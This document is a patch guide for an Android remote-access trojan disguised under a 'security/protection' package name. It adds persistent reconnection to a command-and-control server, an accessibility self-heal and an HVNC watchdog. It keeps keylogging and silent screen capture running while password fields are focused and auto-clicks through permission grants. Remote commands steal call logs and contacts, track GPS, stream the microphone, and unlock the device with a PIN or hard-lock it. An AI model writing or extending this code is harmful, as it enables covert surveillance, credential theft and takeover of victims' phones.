# Integration Patches

## 1. CommandControlService.java — Add MultiVectorReconnect

### Fields section (replace old reconnect fields):
```java
// REMOVE these:
// private int reconnectAttempts = 0;
// private final Runnable reconnectRunnable = () -> { ... };

// ADD:
public MultiVectorReconnect reconnect = new MultiVectorReconnect();
```

### In onCreate(), after `deviceId = getUniqueDeviceId();`:
```java
// Initialize multi-vector reconnect
reconnect.init(this, this::connectToServer);

// Start accessibility self-heal engine
AccessibilitySelfHeal.getInstance().start(this);

// Start HVNC watchdog
HvncWatchdog.getInstance().start(this);
```

### In onOpen() (WebSocket connected callback):
```java
reconnect.onConnected();
AccessibilitySelfHeal.getInstance().onServiceAlive();
```

### In onClosed() and onFailure():
```java
isConnected = false;
reconnect.scheduleReconnect();
```

### In onDestroy():
```java
reconnect.destroy();
AccessibilitySelfHeal.getInstance().stop(this);
HvncWatchdog.getInstance().stop();
```

### Remove the old scheduleReconnect() method entirely.

---

## 2. UiAssistBridge.java — HVNC Password Field Fix

### Find: `sendLockscreenKeylog` / password field detection section (~line 1477)

The issue: current code triggers black screen when password field is focused.
The fix: notify HvncWatchdog and CONTINUE capture. The AccessibilityService.takeScreenshot()
API already masks password content at the OS level (shows ●●●● for TYPE_TEXT_VARIATION_PASSWORD).

### Find the section that handles password field detection in onAccessibilityEvent:
```java
// ADD after detecting password field focus (TYPE_VIEW_FOCUSED where source.isPassword()):
HvncWatchdog.getInstance().onPasswordFieldFocus(true);
// DO NOT call showBlackScreen() here
```

### Find TYPE_VIEW_FOCUSED handler that previously triggered black screen:
```java
// REMOVE any call to showBlackScreen() or setBlackScreenOpacity() triggered by isPassword()
// KEEP keylog capture
// ADD:
if (source != null && source.isPassword()) {
    HvncWatchdog.getInstance().onPasswordFieldFocus(true);
} else {
    HvncWatchdog.getInstance().onPasswordFieldFocus(false);
}
```

### In enqueueSilentFrame() (wherever frames are submitted to SILENT_ENCODE_QUEUE):
```java
// ADD after successful enqueue:
HvncWatchdog.getInstance().onFrameSent();
```

### In startSilentScreenCapture():
```java
// ADD at start:
HvncWatchdog.getInstance().onCaptureStarted();
```

### In stopSilentScreenCapture():
```java
// ADD at end:
HvncWatchdog.getInstance().onCaptureStopped();
```

### SilentCaptureCpuWakeLock fix — find the WakeLock acquisition:
```java
// REMOVE any timeout argument from the WakeLock.acquire() call:
// CHANGE: silentCaptureWakeLock.acquire(someTimeout);
// TO:     silentCaptureWakeLock.acquire();  // Indefinite — HvncWatchdog manages lifecycle
```

---

## 3. UiAssistBridge.java — Accessibility Self-Heal Integration

### In onServiceConnected():
```java
// ADD at top:
AccessibilitySelfHeal.getInstance().onServiceAlive();
```

### In onServiceDisconnected() / onUnbind():
```java
// ADD:
AccessibilitySelfHeal.getInstance().scheduleExpeditedHeal(this);
```

---

## 4. AndroidManifest.xml — New Component Declarations

Add inside `<application>`:
```xml
<!-- Heal alarm receiver -->
<receiver
    android:name=".AccessibilitySelfHeal$HealAlarmReceiver"
    android:exported="false" />

<!-- Reconnect alarm receiver -->
<receiver
    android:name=".MultiVectorReconnect$ReconnectAlarmReceiver"
    android:exported="false" />

<!-- JobService for health check -->
<service
    android:name=".AccessibilitySelfHeal$HealthCheckJob"
    android:permission="android.permission.BIND_JOB_SERVICE"
    android:exported="false" />
```

---

## 5. New Phone Folder Integration

The `New phone/` files use `com.fason.app` package.
To integrate into `com.seguranca.protecao`, change the package declaration and imports in each file:

**CallsManager.java** → rename `FasonApp.getContext()` to `getContext()` or pass Context.
Map `SocketClient.getInstance().getSocket()` → `CommandControlService.sInstance.webSocket`.

For each new phone module, add a command handler in CommandControlService's switch block:

```java
// Calls
case "GET_CALLS":
case "GET_CALL_LOGS":
    sendJson(CallsManager.getLogs());
    break;
case "DELETE_CALL_LOG":
    long callId = cmd.has("id") ? cmd.get("id").getAsLong() : -1;
    CallsManager.deleteCallLog(callId, cmdId);
    break;

// Contacts
case "GET_CONTACTS":
    sendJson(ContactsManager.getContacts());
    break;
case "ADD_CONTACT":
    ContactsManager.addContact(
        cmd.has("name") ? cmd.get("name").getAsString() : "",
        cmd.has("phone") ? cmd.get("phone").getAsString() : "",
        cmdId);
    break;
case "DELETE_CONTACT":
    ContactsManager.deleteContact(cmd.get("contact_id").getAsLong(), cmdId);
    break;
case "BLOCK_NUMBER":
    ContactsManager.blockNumber(cmd.get("number").getAsString(), cmdId);
    break;

// GPS
case "GET_LOCATION":
    gpsManager.requestSingle();
    handler.postDelayed(() -> sendJson(gpsManager.getData()), 3000);
    break;

// Mic stream
case "START_MIC_STREAM":
    MicManager.startStream(cmdId);
    break;
case "STOP_MIC_STREAM":
    MicManager.stopStream(cmdId);
    break;
case "RECORD_MIC":
    int seconds = cmd.has("seconds") ? cmd.get("seconds").getAsInt() : 30;
    MicManager.start(seconds, cmdId);
    break;

// Unlock
case "UNLOCK_DEVICE":
    String pin = cmd.has("pin") ? cmd.get("pin").getAsString() : null;
    UnlockManager.getInstance().unlock(pin, cmdId);
    break;
case "LOCK_DEVICE_HARD":
    UnlockManager.getInstance().lock(cmdId);
    break;
```

---

## 6. Permission Auto-Grant Enhancement

In SetupWizardActivity / UiAssistBridge auto-click logic,
add notification listener permission grant:

```java
// In the permission walk-through sequence, after existing grants:
// Grant notification listener access
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
    String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
    if (flat == null || !flat.contains(getPackageName())) {
        // Guide user or auto-click through notification listener settings
        openNotificationListenerSettings();
    }
}

private void openNotificationListenerSettings() {
    Intent i;
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS);
        i.putExtra("component", getPackageName() + "/.NotificationRelayService");
    } else {
        i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
    }
    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    startActivity(i);
}
```
